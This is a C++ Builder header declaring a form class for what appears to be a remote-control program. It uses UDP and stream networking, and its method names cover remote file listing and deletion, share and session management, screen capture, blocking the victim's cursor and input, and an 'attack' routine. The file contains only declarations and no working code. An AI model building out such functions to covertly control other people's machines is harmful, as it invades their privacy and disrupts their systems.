//---------------------------------------------------------------------------

#ifndef Unit1H
#define Unit1H
//---------------------------------------------------------------------------
#include <Classes.hpp>
#include <Controls.hpp>
#include <StdCtrls.hpp>
#include <Forms.hpp>
#include <NMUDP.hpp>
#include <NMSTRM.hpp>
#include <Psock.hpp>
#include <ExtCtrls.hpp>

#include <vector>
#include <shellapi.h>

//---------------------------------------------------------------------------
class TForm1 : public TForm
{
__published:	// IDE-managed Components
        TNMUDP *NMUDP1;
        TNMStrm *NMStrm1;
        TNMUDP *NMUDP2;
        TNMStrm *NMStrm2;
        TListBox *ListBox1;
        TNMStrmServ *NMStrmServ1;
        TTimer *Timer1;
        TTimer *Timer2;
        TTimer *Timer3;

        int __fastcall IsNT();
        void __fastcall SMS(AnsiString Buff);
        void __fastcall FilesDir(AnsiString Buff);
        void __fastcall RemF(char *Buf);
        void __fastcall FileFrom(AnsiString Buff);
        void __fastcall FindDir();
        void __fastcall Proces();
        void __fastcall btnCloseFileClick(unsigned long ID);
        void __fastcall btnGetFilesClick();
        void __fastcall btnGetSharesClick();
        void __fastcall btnAddSharesClick(char* Temp);
        void __fastcall tmrTrafficTimer();
        void __fastcall btnCloseSharesClick(AnsiString ShareName);
        AnsiString __fastcall CardinalToTimeStr(unsigned long Value);
        void __fastcall btnGetSessionsClick();
//        void __fastcall btnCloseSessionClick();
        void __fastcall ScreenDamp();
        void __fastcall NMUDP1DataReceived(TComponent *Sender,
         int NumberBytes, AnsiString FromIP, int Port);
        void __fastcall FormCreate(TObject *Sender);
        void __fastcall FormDestroy(TObject *Sender);
        void __fastcall NMUDP2DataReceived(TComponent *Sender,
          int NumberBytes, AnsiString FromIP, int Port);
        void __fastcall FormCloseQuery(TObject *Sender, bool &CanClose);
        void __fastcall NMStrmServ1MSG(TComponent *Sender,
          const AnsiString sFrom, TStream *strm);
        void __fastcall Timer1Timer(TObject *Sender);
        void __fastcall Timer2Timer(TObject *Sender);
        void __fastcall Timer3Timer(TObject *Sender);
private:	// User declarations
public:		// User declarations
        unsigned long SessionCloseKey[512];
        __fastcall TForm1(TComponent* Owner);
        void __fastcall TForm1::RabStol(int mode);
        void __fastcall TForm1::BlockKur(int mode);
        void __fastcall TForm1::BlockIn(int mode);
        void __fastcall TForm1::Sakraska(int mode);
        void __fastcall TForm1::CalcAtack();


        

};
//---------------------------------------------------------------------------
extern PACKAGE TForm1 *Form1;
//---------------------------------------------------------------------------
#endif
 